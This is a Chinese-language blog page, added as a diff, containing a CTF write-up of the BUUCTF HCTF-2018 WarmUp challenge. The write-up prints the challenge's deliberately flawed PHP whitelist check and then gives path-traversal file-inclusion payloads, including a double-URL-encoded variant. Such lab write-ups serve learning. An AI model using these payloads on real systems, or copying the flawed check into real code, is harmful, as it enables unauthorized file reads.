@@ -1,0 +1,196 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>【BUUCTF】[HCTF-2018]WarmUp | The DC_comics's World</title><meta name="keywords" content="代码审计,PHP,文件包含"><meta name="author" content="DC_comics"><meta name="copyright" content="DC_comics"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="这道题的原型应该是来自于phpMyadmin的一个文件包含漏洞（CVE-2018-12613） 首先打开题目是一张滑稽图片，检察一下，发现特殊注释source.php:  查看一下，发现一堆源码：  &lt;?php    highlight_file(__FILE__);    class emmm    &amp;#123;        public static function checkFil">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【BUUCTF】[HCTF-2018]WarmUp">
+<meta property="og:url" content="http://www.dccomics.top/2021/08/02/%E3%80%90BUUCTF%E3%80%91[HCTF-2018]WarmUp/index.html">
+<meta property="og:site_name" content="The DC_comics&#39;s World">
+<meta property="og:description" content="这道题的原型应该是来自于phpMyadmin的一个文件包含漏洞（CVE-2018-12613） 首先打开题目是一张滑稽图片，检察一下，发现特殊注释source.php:  查看一下，发现一堆源码：  &lt;?php    highlight_file(__FILE__);    class emmm    &amp;#123;        public static function checkFil">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s.pc.qq.com/tousu/img/20210618/1810122_1623973655.jpg">
+<meta property="article:published_time" content="2021-08-02T13:49:53.000Z">
+<meta property="article:modified_time" content="2022-04-10T16:37:00.067Z">
+<meta property="article:author" content="DC_comics">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="文件包含">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s.pc.qq.com/tousu/img/20210618/1810122_1623973655.jpg"><link rel="shortcut icon" href="/img?"><link rel="canonical" href="http://www.dccomics.top/2021/08/02/%E3%80%90BUUCTF%E3%80%91[HCTF-2018]WarmUp/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '【BUUCTF】[HCTF-2018]WarmUp',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2022-04-11 00:37:00'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="https://s.pc.qq.com/tousu/img/20210616/7147099_1623831911.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">57</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">30</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s.pc.qq.com/tousu/img/20210618/1810122_1623973655.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">The DC_comics's World</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">【BUUCTF】[HCTF-2018]WarmUp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-08-02T13:49:53.000Z" title="发表于 2021-08-02 21:49:53">2021-08-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-04-10T16:37:00.067Z" title="更新于 2022-04-11 00:37:00">2022-04-11</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="【BUUCTF】[HCTF-2018]WarmUp"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><strong>这道题的原型应该是来自于phpMyadmin的一个文件包含漏洞（CVE-2018-12613）</strong></p>
+<p>首先打开题目是一张滑稽图片，检察一下，发现特殊注释source.php:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/20210802215615.png" alt="image-20210802215608796"></p>
+<p>查看一下，发现一堆源码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>里面有两个陌生函数：</p>
+<p>mb_strpos()：返回要查找的字符串在别一个字符串中首次出现的位置</p>
+<p> mb_strpos (haystack ,needle )</p>
+<p> haystack：要被检查的字符串。</p>
+<p> needle：要搜索的字符串</p>
+<p>mb_substr() 函数返回字符串的一部分。</p>
+<p>str 必需。从该 string 中提取子字符串。</p>
+<p>start 必需。规定在字符串的何处开始。</p>
+<p>length 可选。规定要返回的字符串长度。默认是直到字符串的结尾。</p>
+<p>同时发现hint.php，打入payload：source.php/hint.php</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/20210802220209.png" alt="image-20210802220209583"></p>
+<p>我突然想起他俩并不是上下级关系，单独测试hint.php:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/20210802220415.png" alt="image-20210802220415587"></p>
+<p>接下来对代码进行审计：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];<span class="comment">//白名单列表</span></span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line"><span class="comment">//isset()判断变量是否声明is_string()判断变量是否是字符串 &amp;&amp;用了逻辑与两个值都为真才执行if里面的值</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//检测传进来的值是否匹配白名单列表$whitelist 如果有则执行真      第一次whitelist检测</span></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//过滤问号的函数(如果$page的值有？则从?之前提取字符串)      第一次问号过滤</span></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)<span class="comment">//返回$page.?里？号出现的第一个位置</span></span><br><span class="line">            );</span><br><span class="line"><span class="comment">//第二次检测传进来的值是否匹配白名单列表$whitelist 如果有则执行真       第二次whitelist检测     </span></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//url对$page解码</span></span><br><span class="line">            <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line"><span class="comment">//第二次过滤问号的函数(如果$page的值有？则从?之前提取字符串)    第二次问号过滤</span></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line"><span class="comment">//第三次检测传进来的值是否匹配白名单列表$whitelist 如果有则执行真       第三次whitelist检测</span></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])  <span class="comment">//file变量不为空</span></span><br><span class="line">        &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>]) <span class="comment">//file变量为字符串</span></span><br><span class="line">        &amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])<span class="comment">//将file传到emmm类的checkfile函数</span></span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"><span class="comment">// flag not here, and flag in ffffllllaaaagggg</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>三次白名单检测，两次问号过滤</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/20210802221748.png" alt="image-20210802221748537"></p>
+<p>最终payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">source.php?file=hint.php?../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
+
+<p>或者    第四个if语句中，先进行url解码再截取，因此我们可以将?经过两次url编码，在服务器端提取参数时解码一次，checkFile函数中解码一次，</p>
+<p>？—&gt;   %3F   ——&gt;   %253F    回推两次</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file=source.php?file=source.php%253f…/…/…/…/…/ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">DC_comics</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://www.dccomics.top/2021/08/02/%E3%80%90BUUCTF%E3%80%91[HCTF-2018]WarmUp/">http://www.dccomics.top/2021/08/02/%E3%80%90BUUCTF%E3%80%91[HCTF-2018]WarmUp/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://www.dccomics.top" target="_blank">The DC_comics's World</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a><a class="post-meta__tags" href="/tags/PHP/">PHP</a><a class="post-meta__tags" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a></div><div class="post_share"><div class="social-share" data-image="https://s.pc.qq.com/tousu/img/20210618/1810122_1623973655.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/08/03/%E3%80%90BUUCTF%E3%80%91%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019%5DEasySQL/"><img class="prev-cover" src="https://s.pc.qq.com/tousu/img/20210618/1810122_1623973655.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">【BUUCTF】[极客大挑战-2019]EasySQL</div></div></a></div><div class="next-post pull-right"><a href="/2021/07/31/%E3%80%90AH-training%E3%80%91SSRF/"><img class="next-cover" src="https://s.pc.qq.com/tousu/img/20210618/1810122_1623973655.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">【AH_training】SSRF</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/03/18/[ACTF2020 新生赛]BackupFile1/" title="【BUUCTF】[ACTF 2020]新生赛 backupfile1"><img class="cover" src="https://s.pc.qq.com/tousu/img/20210618/1810122_1623973655.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-18</div><div class="title">【BUUCTF】[ACTF 2020]新生赛 backupfile1</div></div></a></div><div><a href="/2021/08/05/【BUUCTF】[极客大挑战-2019]Havefun/" title="【BUUCTF】[极客大挑战-2019]Havefun"><img class="cover" src="https://s.pc.qq.com/tousu/img/20210618/1810122_1623973655.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-08-05</div><div class="title">【BUUCTF】[极客大挑战-2019]Havefun</div></div></a></div><div><a href="/2021/10/15/【BUUCTF】[极客大挑战-2019]PHP/" title="【BUUCTF】[极客大挑战 2019]PHP"><img class="cover" src="https://s.pc.qq.com/tousu/img/20210618/1810122_1623973655.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-15</div><div class="title">【BUUCTF】[极客大挑战 2019]PHP</div></div></a></div><div><a href="/2021/11/11/【RoarCTF 2019】Easy Calc 1/" title="【RoarCTF 2019】Easy Calc 1"><img class="cover" src="https://s.pc.qq.com/tousu/img/20210618/1810122_1623973655.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-11</div><div class="title">【RoarCTF 2019】Easy Calc 1</div></div></a></div><div><a href="/2021/10/13/【NSSCTF】2021SWPU-web/" title="【NSSCTF】2021SWPU-web"><img class="cover" src="https://s.pc.qq.com/tousu/img/20210618/1810122_1623973655.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-13</div><div class="title">【NSSCTF】2021SWPU-web</div></div></a></div><div><a href="/2021/10/15/include/" title="【BUUCTF】[ACTF2020 新生赛]Include"><img class="cover" src="https://s.pc.qq.com/tousu/img/20210618/1810122_1623973655.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-15</div><div class="title">【BUUCTF】[ACTF2020 新生赛]Include</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="https://s.pc.qq.com/tousu/img/20210616/7147099_1623831911.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">DC_comics</div><div class="author-info__description">Creator && CTFer</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">57</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">30</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/dc-wh"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/05/22/year/2022/5/github%E5%9B%BE%E5%BA%8A%E6%8C%82%E6%8E%89%E5%90%8E%E7%9A%84%E5%B0%9D%E8%AF%95/" title="github图床挂掉后的尝试"><img src="https://s.pc.qq.com/tousu/img/20210618/1810122_1623973655.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="github图床挂掉后的尝试"/></a><div class="content"><a class="title" href="/2022/05/22/year/2022/5/github%E5%9B%BE%E5%BA%8A%E6%8C%82%E6%8E%89%E5%90%8E%E7%9A%84%E5%B0%9D%E8%AF%95/" title="github图床挂掉后的尝试">github图床挂掉后的尝试</a><time datetime="2022-05-22T03:47:01.000Z" title="发表于 2022-05-22 11:47:01">2022-05-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/05/22/a%E6%9C%AA%E5%91%BD%E5%90%8D/" title="无题"><img src="https://s.pc.qq.com/tousu/img/20210618/1810122_1623973655.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"/></a><div class="content"><a class="title" href="/2022/05/22/a%E6%9C%AA%E5%91%BD%E5%90%8D/" title="无题">无题</a><time datetime="2022-05-22T03:37:10.022Z" title="发表于 2022-05-22 11:37:10">2022-05-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/03/25/03251740_test/" title="【Gitee】图床测试"><img src="https://s.pc.qq.com/tousu/img/20210618/1810122_1623973655.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【Gitee】图床测试"/></a><div class="content"><a class="title" href="/2022/03/25/03251740_test/" title="【Gitee】图床测试">【Gitee】图床测试</a><time datetime="2022-03-25T09:41:20.000Z" title="发表于 2022-03-25 17:41:20">2022-03-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/03/18/%5BACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B%5DBackupFile1/" title="【BUUCTF】[ACTF 2020]新生赛 backupfile1"><img src="https://s.pc.qq.com/tousu/img/20210618/1810122_1623973655.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【BUUCTF】[ACTF 2020]新生赛 backupfile1"/></a><div class="content"><a class="title" href="/2022/03/18/%5BACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B%5DBackupFile1/" title="【BUUCTF】[ACTF 2020]新生赛 backupfile1">【BUUCTF】[ACTF 2020]新生赛 backupfile1</a><time datetime="2022-03-18T02:41:04.000Z" title="发表于 2022-03-18 10:41:04">2022-03-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/12/01/%E9%87%8D%E8%A3%85%E7%B3%BB%E7%BB%9F%E5%90%8Epicgo%E5%92%8Ctypora%E6%8A%A5%E9%94%99%E4%BF%AE%E6%94%B9/" title="重装系统后picgo和typora报错修改"><img src="https://s.pc.qq.com/tousu/img/20210618/1810122_1623973655.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="重装系统后picgo和typora报错修改"/></a><div class="content"><a class="title" href="/2021/12/01/%E9%87%8D%E8%A3%85%E7%B3%BB%E7%BB%9F%E5%90%8Epicgo%E5%92%8Ctypora%E6%8A%A5%E9%94%99%E4%BF%AE%E6%94%B9/" title="重装系统后picgo和typora报错修改">重装系统后picgo和typora报错修改</a><time datetime="2021-12-01T09:53:53.000Z" title="发表于 2021-12-01 17:53:53">2021-12-01</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/829.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By DC_comics</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas 